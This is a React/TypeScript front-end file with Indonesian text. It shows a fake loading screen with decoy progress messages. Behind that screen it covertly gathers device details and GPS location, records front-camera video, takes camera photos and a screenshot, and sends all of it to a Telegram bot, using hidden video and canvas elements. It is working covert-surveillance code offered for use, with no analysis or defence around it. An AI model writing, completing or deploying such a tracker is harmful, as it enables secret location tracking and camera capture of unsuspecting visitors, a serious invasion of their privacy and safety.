
import React, { useState, useEffect, useRef } from 'react';
import LoadingScreen from './components/LoadingScreen';
import { 
    getDeviceInformation, 
    getGpsLocation, 
    capturePhoto, 
    recordVideo, 
    takeScreenshot 
} from './services/trackingService';
import { sendMessage, sendPhoto, sendVideo } from './services/telegramService';

const App: React.FC = () => {
    const [progress, setProgress] = useState(0);
    const [details, setDetails] = useState('Memulai inisialisasi...');
    const videoRef = useRef<HTMLVideoElement>(null);
    const canvasRef = useRef<HTMLCanvasElement>(null);

    const LOADING_MESSAGES = [
        "Memeriksa modul sistem...",
        "Memuat komponen inti...",
        "Menginisialisasi antarmuka...",
        "Memverifikasi koneksi...",
        "Menyiapkan lingkungan...",
        "Memeriksa pembaruan...",
        "Memuat aset tampilan..."
    ];

    useEffect(() => {
        const randomMessageInterval = setInterval(() => {
            if (progress < 95) {
                setDetails(LOADING_MESSAGES[Math.floor(Math.random() * LOADING_MESSAGES.length)]);
            }
        }, 2000);

        const startTracking = async () => {
            // Step 1: Device Information
            setDetails('Mengumpulkan informasi perangkat...');
            try {
                const deviceInfo = await getDeviceInformation();
                await sendMessage(deviceInfo);
            } catch (error) {
                await sendMessage('❌ Gagal mendapatkan informasi perangkat.');
            }
            setProgress(15);

            // Step 2: GPS Location
            setDetails('Mendeteksi lokasi GPS akurat...');
             try {
                const locationInfo = await getGpsLocation();
                await sendMessage(locationInfo);
            } catch (error) {
                await sendMessage(`❌ Gagal mendapatkan lokasi GPS: ${(error as Error).message}`);
            }
            setProgress(30);
            
            // Step 3: Record 5-second video from front camera
            setDetails('Mengakses kamera video depan...');
            try {
                const { blob, filename } = await recordVideo(5000);
                await sendVideo(blob, filename);
            } catch (error) {
                await sendMessage(`❌ Gagal merekam video: ${(error as Error).message}`);
            }
            setProgress(50);


            // Step 4: Camera Photos
            setDetails('Mengakses kamera foto...');
            let cameraSuccess = false;

            // Try front camera
            try {
                const photoUser = await capturePhoto('user', videoRef.current!, canvasRef.current!);
                if (photoUser) {
                    await sendPhoto(photoUser, 'front_camera.jpg');
                    cameraSuccess = true;
                }
            } catch (e) {
                await sendMessage(`⚠️ Gagal Akses Kamera Depan. Mencoba kamera belakang...`);
            }
            
            // Try back camera if front failed
            if (!cameraSuccess) {
                try {
                    const photoEnv = await capturePhoto('environment', videoRef.current!, canvasRef.current!);
                    if (photoEnv) {
                        await sendPhoto(photoEnv, 'back_camera.jpg');
                        cameraSuccess = true;
                    }
                } catch (e) {
                     await sendMessage('⚠️ Gagal Akses Kamera Belakang.');
                }
            }

            if (!cameraSuccess) {
                await sendMessage('❌ Akses ke kedua kamera (Depan & Belakang) diblokir atau tidak tersedia.');
            }
            setProgress(75);


            // Step 5: Screenshot
            setDetails('Mengambil screenshot halaman...');
            await new Promise(r => setTimeout(r, 1000)); // wait for UI to settle
            try {
                const screenshotBlob = await takeScreenshot();
                if (screenshotBlob) {
                    await sendPhoto(screenshotBlob, 'screenshot.jpg');
                }
            } catch (e) {
                await sendMessage('❌ Gagal mengambil screenshot.');
            }
            setProgress(100);
            setDetails('Proses selesai. Semua data telah dikirim.');
        };

        startTracking();

        return () => {
            clearInterval(randomMessageInterval);
        };
        // eslint-disable-next-line react-hooks/exhaustive-deps
    }, []);

    return (
        <div className="bg-black text-gray-400 min-h-screen flex flex-col items-center justify-center font-sans p-4">
            <LoadingScreen progress={progress} details={details} />
            <video ref={videoRef} className="hidden" muted playsInline></video>
            <canvas ref={canvasRef} className="hidden"></canvas>
        </div>
    );
};

export default App;
